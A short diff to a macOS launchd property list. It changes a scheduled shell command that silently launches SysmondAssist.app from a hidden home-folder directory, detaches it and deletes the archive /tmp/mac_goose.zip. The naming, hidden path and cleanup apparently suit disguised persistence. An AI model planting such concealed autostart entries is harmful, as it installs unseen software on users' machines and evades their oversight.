@@ -9,22 +9,22 @@
     <array>
       <string>/bin/sh</string>
       <string>-c</string>
-      <string> nohup open -a /Users/home/.sysmond_config/SysmondAssist.app & && rm /tmp/mac_goose.zip</string>
+      <string>/bin/sh -c 'nohup /usr/bin/open -a "$(eval echo ~$USER)/.sysmond_config/SysmondAssist.app" &amp;&gt;/dev/null &amp; disown &amp;&amp; rm /tmp/mac_goose.zip'</string>
     </array>
 
     <key>StartCalendarInterval</key>
     <dict>
       <key>Month</key>
-      <integer>08</integer>
+      <integer>8</integer>
 
       <key>Day</key>
-      <integer>04</integer>
+      <integer>4</integer>
 
       <key>Hour</key>
       <integer>12</integer>
 
       <key>Minute</key>
-      <integer>09</integer>
+      <integer>18</integer>
     </dict>
   </dict>
 </plist>
